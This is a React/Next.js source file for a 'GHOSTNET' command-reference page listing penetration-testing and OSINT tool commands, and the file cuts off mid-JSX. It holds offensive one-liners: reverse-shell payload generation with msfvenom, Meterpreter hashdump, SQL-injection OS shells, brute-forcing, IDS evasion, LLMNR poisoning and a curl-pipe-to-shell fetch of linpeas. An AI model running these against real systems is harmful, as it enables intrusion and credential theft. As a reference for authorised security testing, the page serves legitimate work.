'use client'
import React, { useState, useMemo } from 'react'
import Link from 'next/link'

interface Command {
  cmd: string
  desc: string
  example?: string
  tags: string[]
}

interface Tool {
  name: string
  category: string
  desc: string
  install: string
  color: string
  commands: Command[]
}

const TOOLS: Tool[] = [
  {
    name: 'nmap', category: 'offensive', color: '#bf5fff',
    desc: 'Network discovery and security auditing',
    install: 'sudo apt install nmap',
    commands: [
      { cmd: 'nmap -sS TARGET', desc: 'SYN stealth scan (requires root)', tags: ['scan', 'stealth'] },
      { cmd: 'nmap -sV TARGET', desc: 'Service version detection', tags: ['enum', 'version'] },
      { cmd: 'nmap -sC TARGET', desc: 'Run default NSE scripts', tags: ['scripts', 'enum'] },
      { cmd: 'nmap -O TARGET', desc: 'OS fingerprinting', tags: ['os', 'fingerprint'] },
      { cmd: 'nmap -p- TARGET', desc: 'Scan all 65535 ports', tags: ['ports', 'full'] },
      { cmd: 'nmap -p 80,443,8080 TARGET', desc: 'Scan specific ports', tags: ['ports'] },
      { cmd: 'nmap -sU TARGET', desc: 'UDP scan', tags: ['udp', 'scan'] },
      { cmd: 'nmap -sn 192.168.1.0/24', desc: 'Ping sweep — find live hosts', tags: ['discovery', 'ping'] },
      { cmd: 'nmap -T4 TARGET', desc: 'Aggressive timing (faster, noisier)', tags: ['timing'] },
      { cmd: 'nmap -T0 TARGET', desc: 'Paranoid timing (slowest, stealthiest)', tags: ['timing', 'stealth'] },
      { cmd: 'nmap -D RND:10 TARGET', desc: 'Decoy scan — hide among fake IPs', tags: ['evasion', 'decoy'] },
      { cmd: 'nmap -f TARGET', desc: 'Fragment packets to evade IDS', tags: ['evasion', 'fragment'] },
      { cmd: 'nmap --script vuln TARGET', desc: 'Run all vulnerability scripts', tags: ['vuln', 'scripts'] },
      { cmd: 'nmap --script smb-vuln-ms17-010 -p445 TARGET', desc: 'Check EternalBlue vulnerability', tags: ['smb', 'vuln', 'windows'] },
      { cmd: 'nmap --script http-enum TARGET', desc: 'Enumerate web directories', tags: ['web', 'enum'] },
      { cmd: 'nmap -oA output TARGET', desc: 'Save output in all formats', tags: ['output'] },
      { cmd: 'nmap -oX output.xml TARGET', desc: 'XML output (for Metasploit import)', tags: ['output', 'metasploit'] },
      { cmd: 'nmap -sV -sC -O -p- -T4 -oA full TARGET', desc: 'Full comprehensive recon scan', tags: ['full', 'recon'] },
    ]
  },
  {
    name: 'metasploit', category: 'offensive', color: '#bf5fff',
    desc: 'Penetration testing framework',
    install: 'sudo apt install metasploit-framework && sudo msfdb init',
    commands: [
      { cmd: 'msfconsole', desc: 'Launch Metasploit console', tags: ['launch'] },
      { cmd: 'search TYPE:exploit PLATFORM:windows', desc: 'Search exploits by platform', tags: ['search'] },
      { cmd: 'use exploit/windows/smb/ms17_010_eternalblue', desc: 'Load EternalBlue exploit', tags: ['exploit', 'smb'] },
      { cmd: 'show options', desc: 'Show required module options', tags: ['config'] },
      { cmd: 'set RHOSTS TARGET_IP', desc: 'Set target host(s)', tags: ['config'] },
      { cmd: 'set LHOST YOUR_IP', desc: 'Set local listener IP', tags: ['config'] },
      { cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', desc: 'Set Meterpreter payload', tags: ['payload'] },
      { cmd: 'check', desc: 'Check if target is vulnerable', tags: ['check'] },
      { cmd: 'run', desc: 'Execute the exploit', tags: ['exploit'] },
      { cmd: 'sessions -l', desc: 'List all active sessions', tags: ['sessions'] },
      { cmd: 'sessions -i 1', desc: 'Interact with session 1', tags: ['sessions'] },
      { cmd: 'background', desc: 'Background current session (Ctrl+Z)', tags: ['sessions'] },
      { cmd: 'route add 10.0.0.0/24 1', desc: 'Add pivot route through session', tags: ['pivot', 'post'] },
      { cmd: 'meterpreter> sysinfo', desc: 'System information', tags: ['post', 'info'] },
      { cmd: 'meterpreter> hashdump', desc: 'Dump password hashes', tags: ['post', 'creds'] },
      { cmd: 'meterpreter> getsystem', desc: 'Attempt privilege escalation', tags: ['privesc', 'post'] },
      { cmd: 'meterpreter> run post/multi/recon/local_exploit_suggester', desc: 'Find local privilege escalation vectors', tags: ['privesc', 'post'] },
      { cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe', desc: 'Generate standalone payload', tags: ['payload', 'generate'] },
    ]
  },
  {
    name: 'sqlmap', category: 'web', color: '#00d4ff',
    desc: 'Automatic SQL injection detection and exploitation',
    install: 'sudo apt install sqlmap',
    commands: [
      { cmd: 'sqlmap -u "URL?id=1"', desc: 'Test URL parameter for SQLi', tags: ['detect'] },
      { cmd: 'sqlmap -u "URL" --data="user=a&pass=b"', desc: 'Test POST parameters', tags: ['detect', 'post'] },
      { cmd: 'sqlmap -r request.txt', desc: 'Test from saved Burp request file', tags: ['detect', 'burp'] },
      { cmd: 'sqlmap -u "URL?id=1" --dbs', desc: 'Enumerate databases', tags: ['enum', 'dbs'] },
      { cmd: 'sqlmap -u "URL?id=1" -D dbname --tables', desc: 'Enumerate tables in database', tags: ['enum', 'tables'] },
      { cmd: 'sqlmap -u "URL?id=1" -D db -T users --dump', desc: 'Dump table contents', tags: ['dump', 'data'] },
      { cmd: 'sqlmap -u "URL?id=1" --passwords', desc: 'Extract password hashes', tags: ['dump', 'creds'] },
      { cmd: 'sqlmap -u "URL?id=1" --os-shell', desc: 'Attempt OS shell via SQLi', tags: ['shell', 'rce'] },
      { cmd: 'sqlmap -u "URL?id=1" --random-agent', desc: 'Randomize User-Agent', tags: ['evasion'] },
      { cmd: 'sqlmap -u "URL?id=1" --tamper=space2comment', desc: 'Apply WAF bypass tamper', tags: ['waf', 'evasion'] },
      { cmd: 'sqlmap -u "URL?id=1" --tor', desc: 'Route through Tor network', tags: ['anonymity', 'tor'] },
      { cmd: 'sqlmap -u "URL?id=1" --level=5 --risk=3', desc: 'Maximum detection thoroughness', tags: ['thorough'] },
      { cmd: 'sqlmap -u "URL?id=1" --dbms=mysql', desc: 'Specify database type', tags: ['config'] },
      { cmd: 'sqlmap -u "URL?id=1" --cookie="session=TOKEN"', desc: 'Include session cookie', tags: ['auth', 'config'] },
    ]
  },
  {
    name: 'hydra', category: 'offensive', color: '#bf5fff',
    desc: 'Online password brute-force attack tool',
    install: 'sudo apt install hydra',
    commands: [
      { cmd: 'hydra -l admin -P wordlist.txt ssh://TARGET', desc: 'SSH brute force single user', tags: ['ssh', 'brute'] },
      { cmd: 'hydra -L users.txt -P pass.txt ssh://TARGET', desc: 'SSH brute force user list', tags: ['ssh', 'brute'] },
      { cmd: 'hydra -l admin -P wordlist.txt ftp://TARGET', desc: 'FTP brute force', tags: ['ftp', 'brute'] },
      { cmd: 'hydra -l admin -P wordlist.txt rdp://TARGET', desc: 'RDP brute force', tags: ['rdp', 'windows'] },
      { cmd: 'hydra -l admin -P wordlist.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', desc: 'HTTP POST form brute force', tags: ['web', 'http', 'brute'] },
      { cmd: 'hydra -l admin -P wordlist.txt http-get://TARGET/admin', desc: 'HTTP Basic Auth brute force', tags: ['web', 'http'] },
      { cmd: 'hydra -t 4 -l admin -P wordlist.txt ssh://TARGET', desc: 'Limit to 4 threads (avoid lockout)', tags: ['threads', 'safe'] },
      { cmd: 'hydra -V -l admin -P wordlist.txt ssh://TARGET', desc: 'Verbose — show each attempt', tags: ['verbose'] },
    ]
  },
  {
    name: 'hashcat', category: 'offensive', color: '#bf5fff',
    desc: 'Advanced GPU-accelerated password recovery',
    install: 'sudo apt install hashcat',
    commands: [
      { cmd: 'hashcat -m 0 hashes.txt wordlist.txt', desc: 'Crack MD5 hashes', tags: ['md5', 'crack'] },
      { cmd: 'hashcat -m 100 hashes.txt wordlist.txt', desc: 'Crack SHA1 hashes', tags: ['sha1', 'crack'] },
      { cmd: 'hashcat -m 1000 hashes.txt wordlist.txt', desc: 'Crack NTLM hashes (Windows)', tags: ['ntlm', 'windows', 'crack'] },
      { cmd: 'hashcat -m 1800 hashes.txt wordlist.txt', desc: 'Crack sha512crypt (Linux shadow)', tags: ['linux', 'shadow', 'crack'] },
      { cmd: 'hashcat -m 3200 hashes.txt wordlist.txt', desc: 'Crack bcrypt hashes', tags: ['bcrypt', 'crack'] },
      { cmd: 'hashcat -m 5600 hashes.txt wordlist.txt', desc: 'Crack NTLMv2 (from Responder)', tags: ['ntlmv2', 'responder'] },
      { cmd: 'hashcat -m 13100 hashes.txt wordlist.txt', desc: 'Crack Kerberos TGS (Kerberoasting)', tags: ['kerberos', 'ad'] },
      { cmd: 'hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule', desc: 'Apply rules for harder passwords', tags: ['rules', 'advanced'] },
      { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d', desc: 'Mask attack (brute force pattern)', tags: ['mask', 'brute'] },
      { cmd: 'hashcat -m 0 hashes.txt --show', desc: 'Show cracked passwords from potfile', tags: ['results'] },
      { cmd: 'hashid hash.txt', desc: 'Identify hash type', tags: ['identify'] },
    ]
  },
  {
    name: 'gobuster', category: 'web', color: '#00d4ff',
    desc: 'Directory, file, and DNS brute forcing',
    install: 'sudo apt install gobuster seclists',
    commands: [
      { cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt', desc: 'Basic directory scan', tags: ['dir', 'scan'] },
      { cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -x php,html,txt,bak', desc: 'Scan with file extensions', tags: ['dir', 'extensions'] },
      { cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -t 50', desc: '50 concurrent threads', tags: ['speed', 'threads'] },
      { cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -k', desc: 'Skip SSL certificate verification', tags: ['ssl', 'https'] },
      { cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -c "session=TOKEN"', desc: 'Include cookie in requests', tags: ['auth', 'cookie'] },
      { cmd: 'gobuster dns -d example.com -w subdomains.txt', desc: 'Subdomain enumeration', tags: ['dns', 'subdomain'] },
      { cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -o results.txt', desc: 'Save results to file', tags: ['output'] },
      { cmd: 'gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', desc: 'Use SecLists medium wordlist', tags: ['wordlist', 'seclists'] },
    ]
  },
  {
    name: 'ffuf', category: 'web', color: '#00d4ff',
    desc: 'Fast web fuzzer for directories, params, headers',
    install: 'sudo apt install ffuf',
    commands: [
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/FUZZ', desc: 'Basic directory fuzz', tags: ['dir', 'fuzz'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/FUZZ.php', desc: 'Fuzz with file extension', tags: ['extensions'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/ -H "Host: FUZZ.example.com"', desc: 'Virtual host fuzzing', tags: ['vhost', 'headers'] },
      { cmd: 'ffuf -w users.txt:USER -w pass.txt:PASS -u http://TARGET/login -d "u=USER&p=PASS" -fc 302', desc: 'POST login brute force', tags: ['brute', 'post'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/FUZZ -mc 200,301,302', desc: 'Filter by status codes', tags: ['filter'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/FUZZ -fs 1234', desc: 'Filter by response size', tags: ['filter'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/?param=FUZZ', desc: 'Parameter value fuzzing', tags: ['params'] },
      { cmd: 'ffuf -w wordlist.txt -u http://TARGET/FUZZ -rate 100', desc: 'Limit requests per second', tags: ['rate', 'safe'] },
    ]
  },
  {
    name: 'tor / torsocks', category: 'tor', color: '#00ff41',
    desc: 'Anonymity network and SOCKS5 proxy wrapper',
    install: 'sudo apt install tor torsocks',
    commands: [
      { cmd: 'sudo systemctl start tor', desc: 'Start Tor service', tags: ['setup'] },
      { cmd: 'sudo systemctl enable tor', desc: 'Auto-start Tor on boot', tags: ['setup'] },
      { cmd: 'systemctl status tor', desc: 'Check Tor service status', tags: ['status'] },
      { cmd: 'torsocks curl https://check.torproject.org/api/ip', desc: 'Verify traffic is going through Tor', tags: ['verify'] },
      { cmd: 'torsocks curl https://api.ipify.org', desc: 'Check Tor exit node IP', tags: ['verify'] },
      { cmd: 'torsocks wget URL', desc: 'Download file through Tor', tags: ['download'] },
      { cmd: 'torsocks ssh user@host', desc: 'SSH through Tor', tags: ['ssh'] },
      { cmd: 'torsocks bash', desc: 'Open shell where all TCP goes through Tor', tags: ['shell'] },
      { cmd: 'nyx', desc: 'Terminal Tor monitor — circuit visualization', tags: ['monitor'] },
      { cmd: 'echo -e "AUTHENTICATE \\\"\\\"\\r\\nSIGNAL NEWNYM\\r\\nQUIT" | nc 127.0.0.1 9051', desc: 'Force new Tor circuit (new identity)', tags: ['circuit', 'identity'] },
      { cmd: 'sudo cat /var/lib/tor/my_service/hostname', desc: 'Get your .onion address', tags: ['hidden-service'] },
    ]
  },
  {
    name: 'theHarvester', category: 'osint', color: '#00d4ff',
    desc: 'Email, subdomain and IP harvesting from public sources',
    install: 'sudo apt install theharvester',
    commands: [
      { cmd: 'theHarvester -d example.com -b all', desc: 'Harvest from all sources', tags: ['full', 'recon'] },
      { cmd: 'theHarvester -d example.com -b google', desc: 'Google search harvesting', tags: ['google'] },
      { cmd: 'theHarvester -d example.com -b linkedin', desc: 'LinkedIn harvesting', tags: ['linkedin', 'socmint'] },
      { cmd: 'theHarvester -d example.com -b shodan', desc: 'Shodan harvesting (needs API key)', tags: ['shodan'] },
      { cmd: 'theHarvester -d example.com -b hunter', desc: 'Hunter.io email harvesting', tags: ['email', 'hunter'] },
      { cmd: 'theHarvester -d example.com -b all -f report', desc: 'Save results to HTML/XML report', tags: ['output'] },
      { cmd: 'theHarvester -d example.com -b bing -l 500', desc: 'Limit to 500 results from Bing', tags: ['bing', 'limit'] },
    ]
  },
  {
    name: 'sherlock', category: 'osint', color: '#00d4ff',
    desc: 'Username enumeration across 300+ social platforms',
    install: 'pip install sherlock-project',
    commands: [
      { cmd: 'sherlock username', desc: 'Search username across all platforms', tags: ['username', 'socmint'] },
      { cmd: 'sherlock username --timeout 10', desc: 'With 10-second timeout per site', tags: ['timeout'] },
      { cmd: 'sherlock username --output results.txt', desc: 'Save results to file', tags: ['output'] },
      { cmd: 'sherlock user1 user2 user3', desc: 'Search multiple usernames at once', tags: ['bulk'] },
      { cmd: 'maigret username', desc: 'Maigret — more comprehensive fork of Sherlock', tags: ['maigret', 'alternative'] },
      { cmd: 'holehe email@example.com', desc: 'Check email registration across 120+ services', tags: ['email', 'holehe'] },
    ]
  },
  {
    name: 'exiftool', category: 'osint', color: '#00d4ff',
    desc: 'Extract and edit metadata from any file type',
    install: 'sudo apt install libimage-exiftool-perl',
    commands: [
      { cmd: 'exiftool image.jpg', desc: 'Extract all metadata from image', tags: ['image', 'metadata'] },
      { cmd: 'exiftool document.pdf', desc: 'Extract metadata from PDF', tags: ['pdf', 'metadata'] },
      { cmd: 'exiftool -r ./folder/', desc: 'Recursively extract from directory', tags: ['bulk', 'recursive'] },
      { cmd: 'exiftool -csv *.pdf > metadata.csv', desc: 'Export all PDF metadata to CSV', tags: ['bulk', 'csv', 'output'] },
      { cmd: 'exiftool file.jpg | grep -E "GPS|Latitude|Longitude"', desc: 'Extract GPS coordinates from image', tags: ['gps', 'location'] },
      { cmd: 'exiftool file.pdf | grep -E "Author|Creator|Company"', desc: 'Extract document author information', tags: ['author', 'intel'] },
      { cmd: 'exiftool -all= image.jpg', desc: 'Strip ALL metadata from file', tags: ['opsec', 'clean'] },
      { cmd: 'exiftool -GPSLatitude -GPSLongitude image.jpg', desc: 'Extract GPS data only', tags: ['gps'] },
    ]
  },
  {
    name: 'amass', category: 'osint', color: '#00d4ff',
    desc: 'Comprehensive attack surface mapping and subdomain enumeration',
    install: 'sudo apt install amass',
    commands: [
      { cmd: 'amass enum -d example.com', desc: 'Active subdomain enumeration', tags: ['subdomain', 'enum'] },
      { cmd: 'amass enum -d example.com -passive', desc: 'Passive only — no direct contact', tags: ['passive', 'opsec'] },
      { cmd: 'amass enum -d example.com -o subdomains.txt', desc: 'Save subdomains to file', tags: ['output'] },
      { cmd: 'amass intel -org "Example Corp"', desc: 'Find domains owned by organisation', tags: ['org', 'intel'] },
      { cmd: 'amass intel -ip 1.2.3.4', desc: 'Find domains associated with IP', tags: ['ip', 'reverse'] },
      { cmd: 'amass db -list', desc: 'List all saved enumeration results', tags: ['db', 'results'] },
    ]
  },
  {
    name: 'subfinder', category: 'osint', color: '#00d4ff',
    desc: 'Fast passive subdomain enumeration',
    install: 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    commands: [
      { cmd: 'subfinder -d example.com', desc: 'Find subdomains passively', tags: ['subdomain', 'passive'] },
      { cmd: 'subfinder -d example.com -silent', desc: 'Clean output — subdomains only', tags: ['output', 'clean'] },
      { cmd: 'subfinder -d example.com -o subs.txt', desc: 'Save to file', tags: ['output'] },
      { cmd: 'subfinder -dL domains.txt', desc: 'Enumerate multiple domains from file', tags: ['bulk'] },
      { cmd: 'subfinder -d example.com -all', desc: 'Use all sources including paid', tags: ['thorough'] },
    ]
  },
  {
    name: 'shodan CLI', category: 'osint', color: '#00d4ff',
    desc: 'Command-line interface for Shodan search engine',
    install: 'pip install shodan && shodan init YOUR_API_KEY',
    commands: [
      { cmd: 'shodan search "org:\\"Example Corp\\""', desc: 'Search by organisation name', tags: ['org', 'search'] },
      { cmd: 'shodan search "port:27017 -authentication"', desc: 'Find exposed MongoDB instances', tags: ['mongodb', 'exposed'] },
      { cmd: 'shodan search "port:9200 product:Elasticsearch"', desc: 'Find exposed Elasticsearch', tags: ['elasticsearch', 'exposed'] },
      { cmd: 'shodan host 1.2.3.4', desc: 'Get all info on a specific IP', tags: ['ip', 'info'] },
      { cmd: 'shodan count "port:22 country:KE"', desc: 'Count matching hosts', tags: ['count', 'stats'] },
      { cmd: 'shodan download results "port:27017 -authentication"', desc: 'Download results to file', tags: ['download', 'bulk'] },
      { cmd: 'shodan parse --fields ip_str,port,org results.json.gz', desc: 'Parse downloaded results', tags: ['parse', 'output'] },
      { cmd: 'shodan search "ssl.cert.subject.cn:\\"*.example.com\\""', desc: 'Find all SSL certs for domain', tags: ['ssl', 'certs', 'subdomain'] },
    ]
  },
  {
    name: 'slither', category: 'crypto', color: '#ffb347',
    desc: 'Smart contract static analysis framework',
    install: 'pip install slither-analyzer',
    commands: [
      { cmd: 'slither contract.sol', desc: 'Analyse a single contract', tags: ['analyse', 'basic'] },
      { cmd: 'slither .', desc: 'Analyse entire project', tags: ['project'] },
      { cmd: 'slither . --print human-summary', desc: 'Human-readable summary', tags: ['summary', 'output'] },
      { cmd: 'slither . --detect reentrancy-eth', desc: 'Check for reentrancy only', tags: ['reentrancy', 'targeted'] },
      { cmd: 'slither . --detect uninitialized-state,uninitialized-local', desc: 'Check uninitialized variables', tags: ['uninitialized'] },
      { cmd: 'slither . --exclude-dependencies', desc: 'Skip node_modules / libraries', tags: ['clean', 'focus'] },
      { cmd: 'slither . --json output.json', desc: 'JSON output for automation', tags: ['json', 'output'] },
      { cmd: 'slither . --filter-paths "node_modules|test"', desc: 'Exclude specific paths', tags: ['filter'] },
    ]
  },
  {
    name: 'foundry', category: 'crypto', color: '#ffb347',
    desc: 'Ethereum development, testing, and security toolchain',
    install: 'curl -L https://foundry.paradigm.xyz | bash && foundryup',
    commands: [
      { cmd: 'forge init project', desc: 'Create new Foundry project', tags: ['setup', 'init'] },
      { cmd: 'forge build', desc: 'Compile contracts', tags: ['compile'] },
      { cmd: 'forge test', desc: 'Run all tests', tags: ['test'] },
      { cmd: 'forge test -vvvv', desc: 'Verbose test output with traces', tags: ['test', 'debug'] },
      { cmd: 'forge test --match-test testExploit', desc: 'Run specific test', tags: ['test', 'targeted'] },
      { cmd: 'forge test --fork-url https://eth.llamarpc.com', desc: 'Fork mainnet for testing', tags: ['fork', 'mainnet'] },
      { cmd: 'forge test --fork-url URL --fork-block-number 18000000', desc: 'Fork at specific block', tags: ['fork', 'historical'] },
      { cmd: 'forge coverage', desc: 'Generate code coverage report', tags: ['coverage'] },
      { cmd: 'anvil', desc: 'Start local Ethereum testnet', tags: ['testnet', 'local'] },
      { cmd: 'anvil --fork-url https://eth.llamarpc.com', desc: 'Fork mainnet locally', tags: ['fork', 'local'] },
      { cmd: 'cast call CONTRACT "function()" --rpc-url URL', desc: 'Call contract function (read)', tags: ['call', 'read'] },
      { cmd: 'cast send CONTRACT "function()" --private-key KEY', desc: 'Send transaction to contract', tags: ['send', 'tx'] },
      { cmd: 'cast storage CONTRACT SLOT', desc: 'Read contract storage slot directly', tags: ['storage', 'forensics'] },
    ]
  },
  {
    name: 'linpeas', category: 'offensive', color: '#bf5fff',
    desc: 'Linux privilege escalation auditing script',
    install: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',
    commands: [
      { cmd: 'curl https://IP:PORT/linpeas.sh | sh', desc: 'Download and run in one command', tags: ['run', 'quick'] },
      { cmd: 'chmod +x linpeas.sh && ./linpeas.sh', desc: 'Run from local file', tags: ['run', 'local'] },
      { cmd: './linpeas.sh 2>/dev/null | tee /tmp/linpeas.txt', desc: 'Run and save output', tags: ['run', 'save'] },
      { cmd: 'find / -perm -u=s -type f 2>/dev/null', desc: 'Find all SUID binaries manually', tags: ['suid', 'manual'] },
      { cmd: 'sudo -l', desc: 'Check sudo permissions for current user', tags: ['sudo', 'privesc'] },
      { cmd: 'cat /etc/cron* /var/spool/cron/* 2>/dev/null', desc: 'Check all cron jobs', tags: ['cron', 'privesc'] },
      { cmd: 'find / -writable -type f 2>/dev/null | grep -v proc', desc: 'Find all world-writable files', tags: ['writable', 'privesc'] },
    ]
  },
  {
    name: 'enum4linux', category: 'offensive', color: '#bf5fff',
    desc: 'Windows/Samba enumeration tool',
    install: 'sudo apt install enum4linux',
    commands: [
      { cmd: 'enum4linux -a TARGET', desc: 'Run all enumeration checks', tags: ['full', 'all'] },
      { cmd: 'enum4linux -U TARGET', desc: 'Enumerate users', tags: ['users'] },
      { cmd: 'enum4linux -S TARGET', desc: 'Enumerate shares', tags: ['shares', 'smb'] },
      { cmd: 'enum4linux -P TARGET', desc: 'Enumerate password policy', tags: ['password', 'policy'] },
      { cmd: 'enum4linux -G TARGET', desc: 'Enumerate groups', tags: ['groups'] },
      { cmd: 'enum4linux -r TARGET', desc: 'Enumerate via RID cycling', tags: ['rid', 'users'] },
    ]
  },
  {
    name: 'responder', category: 'offensive', color: '#bf5fff',
    desc: 'LLMNR/NBT-NS poisoner for credential capture on LAN',
    install: 'git clone https://github.com/lgandx/Responder && cd Responder',
    commands: [
      { cmd: 'sudo python3 Responder.py -I eth0 -rdwv', desc: 'Start Responder on interface', tags: ['capture', 'start'] },
      { cmd: 'sudo python3 Responder.py -I eth0 -A', desc: 'Analysis mode — passive, no poisoning', tags: ['passive', 'recon'] },
      { cmd: 'cat /usr/share/responder/logs/*.txt', desc: 'View captured hashes', tags: ['results', 'hashes'] },
      { cmd: 'hashcat -m 5600 captured_hashes.txt rockyou.txt', desc: 'Crack captured NTLMv2 hashes', tags: ['crack', 'ntlmv2'] },
    ]
  },
  {
    name: 'wireshark / tcpdump', category: 'network', color: '#00ff41',
    desc: 'Network traffic capture and analysis',
    install: 'sudo apt install wireshark tcpdump',
    commands: [
      { cmd: 'sudo tcpdump -i eth0', desc: 'Capture all traffic on interface', tags: ['capture', 'live'] },
      { cmd: 'sudo tcpdump -i eth0 -w capture.pcap', desc: 'Save capture to file', tags: ['capture', 'save'] },
      { cmd: 'sudo tcpdump -i eth0 host 192.168.1.1', desc: 'Filter by host', tags: ['filter', 'host'] },
      { cmd: 'sudo tcpdump -i eth0 port 80', desc: 'Filter by port', tags: ['filter', 'port'] },
      { cmd: 'sudo tcpdump -i eth0 -n "not port 22"', desc: 'Exclude SSH traffic', tags: ['filter', 'exclude'] },
      { cmd: 'sudo tcpdump -i eth0 -A port 80', desc: 'Show HTTP payload in ASCII', tags: ['http', 'payload'] },
      { cmd: 'wireshark capture.pcap', desc: 'Open capture in Wireshark GUI', tags: ['gui', 'analyse'] },
    ]
  },
]

const CATEGORIES = ['all', 'offensive', 'web', 'osint', 'tor', 'crypto', 'network']
const CAT_COLORS: Record<string, string> = {
  offensive: '#bf5fff', web: '#00d4ff', osint: '#00d4ff',
  tor: '#00ff41', crypto: '#ffb347', network: '#00ff41',
}

export default function ToolsPage() {
  const [search, setSearch] = useState('')
  const [category, setCategory] = useState('all')
  const [expandedTool, setExpandedTool] = useState<string | null>(null)
  const [tagFilter, setTagFilter] = useState('')

  const filtered = useMemo(() => {
    return TOOLS.filter(tool => {
      const matchCat = category === 'all' || tool.category === category
      if (!matchCat) return false
      const q = search.toLowerCase()
      if (!q && !tagFilter) return true
      const inName = tool.name.includes(q)
      const inDesc = tool.desc.toLowerCase().includes(q)
      const inCmd = tool.commands.some(c =>
        c.cmd.toLowerCase().includes(q) ||
        c.desc.toLowerCase().includes(q) ||
        (tagFilter && c.tags.includes(tagFilter))
      )
      return inName || inDesc || inCmd
    })
  }, [search, category, tagFilter])

  const allTags = useMemo(() => {
    const tags = new Set<string>()
    TOOLS.forEach(t => t.commands.forEach(c => c.tags.forEach(tag => tags.add(tag))))
    return Array.from(tags).sort()
  }, [])

  const filteredCommands = (tool: Tool) => {
    if (!search && !tagFilter) return tool.commands
    const q = search.toLowerCase()
    return tool.commands.filter(c =>
      (!q || c.cmd.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q)) &&
      (!tagFilter || c.tags.includes(tagFilter))
    )
  }

  return (
    <div>
      <div style={{ marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>GHOSTNET // REFERENCE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#00ff41', margin: '0.5rem 0', textShadow: '0 0 20px rgba(0,255,65,0.3)' }}>TOOL COMMAND REFERENCE</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
          {TOOLS.length} tools · {TOOLS.reduce((n, t) => n + t.commands.length, 0)} commands · instant search
        </p>
      </div>

      {/* Search + filters */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '1rem', flexWrap: 'wrap' as const }}>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="search tools, commands, flags..."
          autoFocus
          style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.82rem', background: '#0e1410', border: '1px solid #1a4a1a', borderRadius: '4px', padding: '8px 14px', color: '#00ff41', outline: 'none', flex: 1, minWidth: '260px' }}
        />
        {CATEGORIES.map(cat => (
          <button key={cat} onClick={() => setCategory(cat)} style={{
            fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', letterSpacing: '0.1em',
            padding: '6px 12px', borderRadius: '3px', cursor: 'pointer',
            background: category === cat ? 'rgba(0,255,65,0.08)' : 'transparent',
            border: `1px solid ${category === cat ? 'rgba(0,255,65,0.3)' : '#1a2e1e'}`,
            color: category === cat ? '#00ff41' : '#3a5a3a',
          }}>{cat.toUpperCase()}</button>
        ))}
      </div>

      {/* Tag filter pills */}
      <div style={{ display: 'flex', gap: '4px', marginBottom: '1.5rem', flexWrap: 'wrap' as const }}>
        {['opsec', 'privesc', 'evasion', 'brute', 'crack', 'subdomain', 'metadata', 'fork', 'smb', 'passive', 'stealth', 'windows'].map(tag => (
          <button key={tag} onClick={() => setTagFilter(tagFilter === tag ? '' : tag)} style={{
            fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', letterSpacing: '0.08em',
            padding: '3px 8px', borderRadius: '2px', cursor: 'pointer',
            background: tagFilter === tag ? 'rgba(0,255,65,0.1)' : 'transparent',
            border: `1px solid ${tagFilter === tag ? 'rgba(0,255,65,0.4)' : '#0e1a0e'}`,
            color: tagFilter === tag ? '#00ff41' : '#2a4a2a',
          }}>#{tag}</button>
        ))}
        {tagFilter && <button onClick={() => setTagFilter('')} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', padding: '3px 8px', borderRadius: '2px', cursor: 'pointer', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', color: '#ff4136' }}>× clear</button>}
      </div>

      {/* Tool cards */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1px', background: '#1a2e1e', borderRadius: '6px', overflow: 'hidden', border: '1px solid #1a2e1e' }}>
        {filtered.map(tool => {
          const cmds = filteredCommands(tool)
          const isOpen = expandedTool === tool.name
          const color = CAT_COLORS[tool.category] || '#00ff41'
          return (
            <div key={tool.name} style={{ background: '#0e1410' }}>
              {/* Tool header */}
              <div
                onClick={() => setExpandedTool(isOpen ? null : tool.name)}
                style={{ padding: '14px 16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '12px', borderLeft: `3px solid ${color}` }}
              >
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 700, color, minWidth: '130px' }}>{tool.name}</span>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a', flex: 1 }}>{tool.desc}</span>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#2a4a2a', marginRight: '8px' }}>{cmds.length} cmds</span>
